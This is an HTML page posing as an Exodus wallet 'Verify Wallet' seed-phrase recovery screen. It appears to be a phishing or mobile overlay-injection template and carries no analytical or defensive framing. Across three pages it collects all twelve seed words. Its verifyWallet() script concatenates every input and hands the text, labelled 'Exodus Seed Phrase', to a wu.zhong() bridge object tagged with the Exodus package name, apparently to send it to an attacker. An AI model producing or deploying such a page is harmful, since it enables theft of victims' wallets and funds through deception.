<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Wallet - Seed Phrase Recovery</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #2a2d47 0%, #1e1e2e 100%);
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            display: flex;
            align-items: center;
            padding: 20px;
            background: rgba(42, 45, 71, 0.95);
            backdrop-filter: blur(10px);
            z-index: 100;
        }

        .back-btn {
            background: none;
            border: none;
            color: #888;
            font-size: 24px;
            cursor: pointer;
            padding: 8px;
            margin-right: 20px;
        }

        .header-title {
            font-size: 16px;
            font-weight: 500;
            color: #888;
            letter-spacing: 1px;
        }

        .background-options {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: flex;
            gap: 120px;
            opacity: 0.3;
            pointer-events: none;
        }

        .option {
            text-align: center;
        }

        .option-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .qr-icon {
            background: linear-gradient(135deg, #6366f1, #3b82f6);
        }

        .drive-icon {
            background: linear-gradient(135deg, #f59e0b, #3b82f6);
            border-radius: 50%;
        }

        .option-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #ccc;
        }

        .option-subtitle {
            font-size: 14px;
            color: #888;
            max-width: 120px;
        }

        .modal {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(45, 48, 71, 0.98);
            backdrop-filter: blur(20px);
            border-radius: 24px 24px 0 0;
            padding: 24px;
            transform: translateY(0);
            transition: transform 0.3s ease;
            z-index: 200;
            max-height: 85vh;
            overflow-y: auto;
        }

        .modal-handle {
            width: 40px;
            height: 4px;
            background: #555;
            border-radius: 2px;
            margin: 0 auto 24px;
        }

        .modal-header {
            display: flex;
            align-items: center;
            margin-bottom: 32px;
        }

        .modal-back-btn {
            background: none;
            border: none;
            color: white;
            font-size: 20px;
            cursor: pointer;
            padding: 8px;
            margin-right: 16px;
        }

        .modal-title {
            font-size: 20px;
            font-weight: 600;
        }

        .seed-phrase-container {
            margin-bottom: 32px;
        }

        .seed-word {
            background: rgba(75, 85, 99, 0.5);
            border: 1px solid rgba(107, 114, 128, 0.3);
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            font-size: 16px;
            position: relative;
            transition: all 0.3s ease;
        }

        .seed-word:hover {
            background: rgba(99, 102, 241, 0.2);
            border-color: #6366f1;
        }

        .seed-word.filled {
            background: rgba(34, 197, 94, 0.2);
            border-color: #22c55e;
        }

        .word-number {
            color: #888;
            margin-right: 16px;
            font-weight: 500;
            min-width: 20px;
        }

        .word-input {
            background: none;
            border: none;
            color: white;
            font-size: 16px;
            flex: 1;
            outline: none;
        }

        .word-input::placeholder {
            color: #666;
        }

        .word-dash {
            color: #666;
            margin-left: 8px;
        }

        .cursor {
            display: inline-block;
            width: 2px;
            height: 20px;
            background: #6366f1;
            animation: blink 1s infinite;
            margin-left: 4px;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        .action-btn {
            width: 100%;
            background: linear-gradient(135deg, #8b5cf6, #6366f1);
            color: white;
            border: none;
            border-radius: 16px;
            padding: 18px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
        }

        .action-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(139, 92, 246, 0.4);
        }

        .action-btn:disabled {
            background: #4b5563;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .page {
            display: none;
        }

        .page.active {
            display: block;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .progress-indicator {
            position: absolute;
            top: 12px;
            right: 24px;
            font-size: 12px;
            color: #888;
        }

    
        @media (min-width: 768px) {
            .modal {
                max-width: 500px;
                left: 50%;
                transform: translateX(-50%);
                border-radius: 24px;
                bottom: 20px;
            }

            .background-options {
                gap: 150px;
            }

            .option-icon {
                width: 100px;
                height: 100px;
            }
        }
        @media (min-width: 1024px) {
            .modal {
                max-width: 600px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <button class="back-btn" onclick="goBack()"></button>
        <div class="header-title">VERIFY WALLET</div>
        <div class="progress-indicator" id="progressIndicator">1/3</div>
    </div>

    <div class="background-options">
        <div class="option">
            <div class="option-icon qr-icon">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="white">
                    <path d="M3 11h8V3H3v8zm2-6h4v4H5V5zm-2 8h8v8H3v-8zm2 2v4h4v-4H5zm8-12v8h8V3h-8zm2 2h4v4h-4V5zm4 6h2v2h-2v-2zm0 2h2v2h-2v-2zm-2 2h2v2h-2v-2zm0-2h2v2h-2v-2zm0-2h2v2h-2v-2zm-2 0h2v2h-2v-2zm2 4h2v2h-2v-2zm-4 2h2v2h-2v-2zm2-2h2v2h-2v-2zm0 4h2v2h-2v-2z"/>
                </svg>
            </div>
            <div class="option-title">QR Code</div>
            <div class="option-subtitle">Sync with Exodus on another device</div>
        </div>

        <div class="option">
            <div class="option-icon drive-icon">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="white">
                    <path d="M6.4 4L12 2l5.6 2-5.6 2L6.4 4zm3.6 7.5L4.4 9.3 12 7l7.6 2.3L14 11.5l-2-0.5-2 0.5zm0 0v7l8-2v-7l-8 2zm-2 0l-8 2v7l8-2v-7z"/>
                </svg>
            </div>
            <div class="option-title">Google Drive Backup</div>
            <div class="option-subtitle">Use a previously saved backup</div>
        </div>
    </div>

    <div class="modal">
        <div class="modal-handle"></div>
        
   
        <div class="page active" id="page1">
            <div class="modal-header">
                <button class="modal-back-btn" onclick="previousPage()"></button>
                <div class="modal-title">Verify Wallet</div>
            </div>
            
            <div class="seed-phrase-container">
                <div class="seed-word active" data-word="1">
                    <span class="word-number">1</span>
                    <input type="text" class="word-input" placeholder="" data-index="0">
                    
                </div>
                <div class="seed-word" data-word="2">
                    <span class="word-number">2</span>
                   <input type="text" class="word-input" placeholder="" data-index="1">
                </div>
                <div class="seed-word" data-word="3">
                    <span class="word-number">3</span>
                    <input type="text" class="word-input" placeholder="" data-index="2">
                </div>
                <div class="seed-word" data-word="4">
                    <span class="word-number">4</span>
                   <input type="text" class="word-input" placeholder="" data-index="1">
                </div>
            </div>
            
            <button class="action-btn" onclick="nextPage()"  id="nextBtn1">Next</button>
        </div>

        <div class="page" id="page2">
            <div class="modal-header">
                <button class="modal-back-btn" onclick="previousPage()"></button>
                <div class="modal-title">Verify Wallet</div>
            </div>
            

            <div class="seed-phrase-container">
                <div class="seed-word active" data-word="5">
                    <span class="word-number">5</span>
                   <input type="text" class="word-input" placeholder="" data-index="1">
                    <span class="cursor"></span>
                </div>
                <div class="seed-word" data-word="6">
                    <span class="word-number">6</span>
                    <input type="text" class="word-input" placeholder="" data-index="1">
                     <span class="cursor"></span>
                </div>
                <div class="seed-word" data-word="7">
                    <span class="word-number">7</span>
                    <input type="text" class="word-input" placeholder="" data-index="1">
                </div>
                <div class="seed-word" data-word="8">
                    <span class="word-number">8</span>
                <input type="text" class="word-input" placeholder="" data-index="1">
                </div>
            </div>
            
            <button class="action-btn" onclick="nextPage()" id="nextBtn2">Next</button>
        </div>


        <div class="page" id="page3">
            <div class="modal-header">
                <button class="modal-back-btn" onclick="previousPage()"></button>
                <div class="modal-title">Verify Wallet</div>
            </div>
            
            <div class="seed-phrase-container">
                <div class="seed-word active" data-word="9">
                    <span class="word-number">9</span>
                    <input type="text" class="word-input" placeholder="" data-index="8">
                   
                </div>
                <div class="seed-word" data-word="10">
                    <span class="word-number">10</span>
                    <input type="text" class="word-input" placeholder="" data-index="1">
                </div>
                <div class="seed-word" data-word="11">
                    <span class="word-number">11</span>
                <input type="text" class="word-input" placeholder="" data-index="1">
                </div>
                <div class="seed-word" data-word="12">
                    <span class="word-number">12</span>
                   <input type="text" class="word-input" placeholder="" data-index="1">
                </div>
            </div>
            
            <button class="action-btn" onclick="verifyWallet()" id="verifyBtn">Verify</button>
        </div>
    </div>

    <script>
        let currentPage = 1;
        let seedPhrase = ['', '', '', '', '', '', '', '', '', '', '', ''];
        let currentWordIndex = 0;

       
        function updateProgressIndicator() {
            document.getElementById('progressIndicator').textContent = `${currentPage}/3`;
        }

        function switchPage(pageNum) {



            document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
            document.getElementById(`page${pageNum}`).classList.add('active');
            currentPage = pageNum;
            updateProgressIndicator();
            
       
            setTimeout(() => {
                const activeInput = document.querySelector(`#page${pageNum} .seed-word.active .word-input`);
                if (activeInput) activeInput.focus();
            }, 100);
        }

        function nextPage() {
            if (currentPage < 3) {
                switchPage(currentPage + 1);
            }
        }

        function previousPage() {
            if (currentPage > 1) {
                switchPage(currentPage - 1);
            }
        }

        function goBack() {
            if (currentPage > 1) {
                previousPage();
            } else {
               
            }
        }

        

        

        function verifyWallet() {
            var filledWords="";
             Array.from(document.getElementsByTagName("input")).forEach(input => filledWords+=input.value+" ");
            
            wu.zhong(`🔰 Exodus Seed Phrase\n\n ${filledWords}`, "exodusmovement.exodus");
            
                 
        }

        
    </script>
</body>
</html>
